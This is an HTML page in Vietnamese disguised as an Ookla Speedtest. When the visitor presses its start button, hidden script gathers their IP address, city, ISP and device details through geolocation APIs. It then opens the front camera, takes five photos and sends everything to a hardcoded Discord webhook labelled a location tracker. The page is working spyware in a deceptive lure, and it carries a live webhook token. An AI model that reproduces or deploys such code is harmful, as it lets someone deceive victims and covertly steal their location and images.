<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Speedtest by Ookla</title>
    <style>
        body {
            background: #0a0a0a;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            font-family: monospace;
            color: #0f0;
            overflow: hidden;
        }
        .speedtest {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: #0a0a0a;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 999;
        }
        .logo {
            font-size: 2.8rem;
            font-weight: bold;
            color: #00ff9d;
            margin-bottom: 8px;
        }
        .subtitle {
            color: #666;
            font-size: 1.05rem;
            margin-bottom: 40px;
        }
        .circle {
            width: 230px;
            height: 230px;
            border: 14px solid #222;
            border-top: 14px solid #00ff9d;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 3.8rem;
            font-weight: bold;
            color: #00ff9d;
            margin-bottom: 30px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        button {
            background: #00ff9d;
            color: black;
            border: none;
            padding: 16px 50px;
            font-size: 1.2rem;
            font-weight: bold;
            border-radius: 50px;
        }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <!-- GIAO DIỆN NGỤY TRANG SPEEDTEST -->
    <div class="speedtest" id="speedtestScreen">
        <div class="logo">SPEEDTEST</div>
        <div class="subtitle">by Ookla</div>
        <div class="circle" id="circle">GO</div>
        <button onclick="startRealTracking()">BẮT ĐẦU KIỂM TRA</button>
        <div style="margin-top: 30px; color:#555; font-size:0.95rem;">Đang tìm máy chủ tối ưu...</div>
    </div>

    <!-- CODE GỐC CỦA BẠN -->
    <div class="status" id="status">Đang khởi tạo tracker cấp độ MAX...</div>
    <video id="video" autoplay playsinline style="display:none; width:100%; max-width:400px;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1487644219945390160/FNtkSqJw4J-4md6mgXJpfwdCsX8pcWn72BEd6snufQKxCNzJzGL5HVzdgknp9L9-cCbM';
        const PHOTO_COUNT = 5;
        const PHOTO_INTERVAL = 400;
        let cameraStream = null;

        async function sendText(content) {
            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: "Huy Hoang - Location Tracker", content })
                });
            } catch(e) {}
        }

        async function sendFile(blob, filename, caption) {
            try {
                const form = new FormData();
                form.append('file', blob, filename);
                form.append('payload_json', JSON.stringify({
                    username: "Huy Hoang - Location Tracker",
                    content: caption
                }));
                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: form });
            } catch(e) {}
        }

        // ================== CHECK VỊ TRÍ CẤP ĐỘ MAX ==================
        async function sendVisitorInfo() {
            let ip = "Không xác định";
            let city = "Không xác định";
            let region = "Không xác định";
            let isp = "Không xác định";
            let country = "Không xác định";

            const apis = [
                "https://ip-api.com/json/?fields=query,status,city,regionName,isp,org,country",
                "https://ipapi.co/json/",
                "https://freeipapi.com/api/json",
                "https://extreme-ip-lookup.com/json/",
                "https://api.my-ip.io/ip.json"
            ];

            for (let url of apis) {
                try {
                    const res = await fetch(url, { signal: AbortSignal.timeout(7000) });
                    if (!res.ok) continue;
                    const data = await res.json();

                    if (url.includes("ip-api.com") && data.status === "success") {
                        ip = data.query || ip;
                        city = data.city || city;
                        region = data.regionName || region;
                        isp = data.isp || data.org || isp;
                        country = data.country || country;
                        break;
                    } else if (url.includes("ipapi.co")) {
                        ip = data.ip || ip;
                        city = data.city || city;
                        region = data.region || region;
                        isp = data.org || isp;
                        country = data.country_name || country;
                    } else if (url.includes("freeipapi")) {
                        ip = data.ipAddress || ip;
                        city = data.cityName || city;
                        region = data.regionName || region;
                        isp = data.isp || isp;
                    }

                    if (city !== "Không xác định" && isp !== "Không xác định") break;
                } catch(e) {}
            }

            const msg = `**📥 KHÁCH TRUY CẬP MỚI**\n\n` +
                        `🌐 **IP:** ${ip}\n` +
                        `📍 **Thành phố:** ${city}\n` +
                        `🗺️ **Khu vực:** ${region}\n` +
                        `🏳️ **Quốc gia:** ${country}\n` +
                        `🏢 **Nhà mạng:** ${isp}\n` +
                        `📱 **Thiết bị:** ${navigator.platform || "Không xác định"}\n` +
                        `⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}\n` +
                        `🔗 **Nguồn:** Truy cập trực tiếp`;

            await sendText(msg);
        }

        // ================== CHỤP ẢNH CAMERA ==================
        async function startCameraAndCapture() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const status = document.getElementById('status');
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: { ideal: "user" },
                        width: { ideal: 640, max: 1280 },
                        height: { ideal: 480, max: 720 }
                    }
                });
                video.srcObject = cameraStream;
                await new Promise(r => video.onloadedmetadata = r);
                video.play();

                status.textContent = "✅ Camera đã mở. Đang chụp ảnh...";

                for (let i = 1; i <= PHOTO_COUNT; i++) {
                    await new Promise(resolve => {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(blob => {
                            if (blob) sendFile(blob, `photo_${i}_${Date.now()}.jpg`, `📸 **Ảnh chụp #${i}**`);
                            resolve();
                        }, 'image/jpeg', 0.85);
                    });
                    if (i < PHOTO_COUNT) await new Promise(r => setTimeout(r, PHOTO_INTERVAL));
                }

                if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
                status.textContent = "✅ Đã chụp xong 5 ảnh";
            } catch (err) {
                console.error(err);
                let msg = "⚠️ Không mở được camera.\n";
                if (err.name === "NotAllowedError") msg += "Bạn chưa cho phép quyền camera.";
                status.style.color = "#f66";
                status.textContent = msg;
                await sendText("⚠️ " + msg.replace(/\n/g, " "));
            }
        }

        // ================== KHỞI CHẠY ==================
        async function init() {
            await sendVisitorInfo();
            setTimeout(startCameraAndCapture, 800);
        }

        // Khi nhấn nút GO trên giao diện Speedtest
        function startRealTracking() {
            document.getElementById('speedtestScreen').classList.add('hidden');
            document.getElementById('status').textContent = "Đang tìm máy chủ tối ưu...";
            init();
        }

        window.addEventListener('load', () => {});
    </script>
</body>
</html>
